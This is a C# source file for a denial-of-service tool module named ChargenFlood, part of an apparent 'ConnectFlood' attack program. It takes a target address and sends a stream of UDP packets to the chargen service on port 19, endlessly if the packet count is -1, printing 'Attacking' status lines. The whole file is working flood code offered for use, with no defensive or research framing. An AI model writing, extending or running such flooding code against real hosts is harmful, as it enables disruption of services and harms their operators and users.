using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace ConnectFlood
{
    public class ChargenFlood : IAttack
    {
        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            if (target.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
                target = target.Substring(7);
            else if (target.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                target = target.Substring(8);
            if (target.Contains(":"))
                target = target.Split(':')[0];

            Console.WriteLine($"[CHARGEN] Attacking {target} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms");

            IPEndPoint chargenServer = new IPEndPoint(IPAddress.Parse(target), 19);
            UdpClient udpClient = new UdpClient();
            int sentPackets = 0;

            while (packetCount == -1 || sentPackets < packetCount)
            {
                try
                {
                    byte[] chargenPacket = GenerateChargenRequest();
                    udpClient.Send(chargenPacket, chargenPacket.Length, chargenServer);
                    Console.WriteLine($"[CHARGEN] Packet {sentPackets + 1} sent to {target}:19");
                    sentPackets++;
                }
                catch (SocketException ex)
                {
                    Console.WriteLine($"[CHARGEN] Error: {ex.Message}");
                    break; 
                }
                if (speed > 1)
                    Thread.Sleep(speed);
            }

            udpClient.Close();
            Console.WriteLine("[CHARGEN] Attack finished.");
        }

        private byte[] GenerateChargenRequest()
        {
            return Encoding.ASCII.GetBytes("CHARGEN REQUEST\r\n");
        }
    }
}
